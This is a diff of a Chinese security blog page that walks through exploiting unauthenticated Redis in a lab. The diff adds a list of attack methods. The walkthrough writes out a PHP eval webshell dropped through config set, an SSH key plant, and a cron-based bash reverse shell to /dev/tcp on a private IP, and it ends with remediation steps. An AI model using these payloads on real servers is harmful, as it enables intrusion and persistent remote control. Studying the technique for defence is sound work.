@@ -68,9 +68,10 @@
 <meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/redis1.jpg">
 <meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/redis2.jpg">
 <meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/redis3.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/redis-cli1.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/redis-cli2.jpg">
-<meta property="og:updated_time" content="2017-07-17T01:13:20.110Z">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/redis-cli.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/redis-cli1.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/redis-cli2.png">
+<meta property="og:updated_time" content="2017-07-17T06:07:35.424Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="配置漏洞之redis未授权访问">
 <meta name="twitter:description" content="点击阅读全文">
@@ -335,7 +336,15 @@ var _hmt = _hmt || [];
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir /usr/redis</div><div class="line">cp redis-server  /usr/redis</div><div class="line">cp redis-benchmark /usr/redis</div><div class="line">cp redis-cli  /usr/redis</div><div class="line">cp redis.conf  /usr/redis</div><div class="line">cd /usr/redis</div></pre></td></tr></table></figure>
 <h3 id="启动redis服务"><a href="#启动redis服务" class="headerlink" title="启动redis服务"></a>启动redis服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-server ./redis.conf</div></pre></td></tr></table></figure>
 <h3 id="查看redis是否开启"><a href="#查看redis是否开启" class="headerlink" title="查看redis是否开启"></a>查看redis是否开启</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ntlp | grep redis</div></pre></td></tr></table></figure>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="利用nmap获取redis信息"><a href="#利用nmap获取redis信息" class="headerlink" title="利用nmap获取redis信息"></a>利用nmap获取redis信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -A -p6379 --script=redis-info 192.168.132.134</div></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
+<li>保存到www目录，创建webshell</li>
+<li>创建SSH authorized_keys文件</li>
+<li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li>
+<li>slave of 8.8.8.8主从模式利用</li>
+<li>写入到/etc/profile.d/用户环境变量</li>
+<li>开启AOF持久化纯文本记录appendfilename</li>
+</ul>
+<h3 id="利用nmap获取redis信息"><a href="#利用nmap获取redis信息" class="headerlink" title="利用nmap获取redis信息"></a>利用nmap获取redis信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -A -p6379 --script=redis-info 192.168.132.134</div></pre></td></tr></table></figure>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/redis1.jpg" alt=""></p>
 <h3 id="利用redis客户端进行未授权访问"><a href="#利用redis客户端进行未授权访问" class="headerlink" title="利用redis客户端进行未授权访问"></a>利用redis客户端进行未授权访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134</div><div class="line">192.168.132.134:6379&gt; info</div></pre></td></tr></table></figure>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/redis2.jpg" alt=""></p>
@@ -353,9 +362,10 @@ var _hmt = _hmt || [];
 <h4 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh –i  id_rsa root@192.168.1.11</div></pre></td></tr></table></figure>
 <h3 id="利用redis写入Shell"><a href="#利用redis写入Shell" class="headerlink" title="利用redis写入Shell"></a>利用redis写入Shell</h3><h4 id="查看是否存在web服务"><a href="#查看是否存在web服务" class="headerlink" title="查看是否存在web服务"></a>查看是否存在web服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap 192.168.1.111</div></pre></td></tr></table></figure>
 <h4 id="确定web服务目录"><a href="#确定web服务目录" class="headerlink" title="确定web服务目录"></a>确定web服务目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /usr/local/apache/htdocs/</div><div class="line">config set dbfilename ok.php </div><div class="line">set test &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
-<h4 id="菜刀连接一句话木马"><a href="#菜刀连接一句话木马" class="headerlink" title="菜刀连接一句话木马"></a>菜刀连接一句话木马</h4><h3 id="写计划任务来反弹shell"><a href="#写计划任务来反弹shell" class="headerlink" title="写计划任务来反弹shell"></a>写计划任务来反弹shell</h3><h4 id="telnet登录-也可以redis-cli登录"><a href="#telnet登录-也可以redis-cli登录" class="headerlink" title="telnet登录/也可以redis-cli登录"></a>telnet登录/也可以redis-cli登录</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli1.jpg" alt=""></p>
+<h4 id="菜刀连接一句话木马"><a href="#菜刀连接一句话木马" class="headerlink" title="菜刀连接一句话木马"></a>菜刀连接一句话木马</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli.png" alt=""></p>
+<h3 id="写计划任务来反弹shell"><a href="#写计划任务来反弹shell" class="headerlink" title="写计划任务来反弹shell"></a>写计划任务来反弹shell</h3><h4 id="telnet登录-也可以redis-cli登录"><a href="#telnet登录-也可以redis-cli登录" class="headerlink" title="telnet登录/也可以redis-cli登录"></a>telnet登录/也可以redis-cli登录</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli1.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">telnet 192.168.236.130 6379 //未授权登录</div><div class="line"></div><div class="line">config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</div><div class="line"></div><div class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1\n\n\n&quot; //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。</div></pre></td></tr></table></figure>
-<h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli2.jpg" alt=""></p>
+<h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli2.png" alt=""></p>
 <h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
 <li>禁止使用 root 权限启动 redis 服务；</li>
 <li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>
@@ -483,7 +493,7 @@ var _hmt = _hmt || [];
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">42</span>
+              <span class="site-state-item-count">43</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
